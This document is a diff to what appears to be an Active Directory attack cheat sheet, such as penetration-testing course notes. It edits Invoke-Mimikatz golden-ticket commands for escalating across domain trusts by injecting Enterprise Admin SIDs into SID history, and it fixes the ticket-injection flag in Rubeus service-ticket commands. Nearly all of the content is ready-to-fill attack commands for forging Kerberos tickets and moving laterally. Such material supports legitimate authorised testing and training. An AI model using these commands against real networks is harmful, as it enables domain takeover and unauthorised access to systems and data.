@@ -435,7 +435,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 #### Create an inter-realm TGT
 - Uses well know Enterprise Admins SIDS
 ```
-Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
 ```
 
 #### Create a TGS using Rubeus and inject current Powershell session
@@ -472,7 +472,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
 #### Create TGT and inject in current session
 - The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
 ```
 
 #### Check access to server
@@ -521,7 +521,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 #### Create and inject TGS
 - Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
 ```
-.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /pt
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
 ```
 
 #### Create a TGS for a service (kekeo_old)
@@ -563,7 +563,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 #### Create and inject TGS
 - Possbible services: CIF for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM and LDAP for dcsync
 ```
-.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /pt
+.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
 ```
 
 #### Create a TGS for a service (kekeo_old)
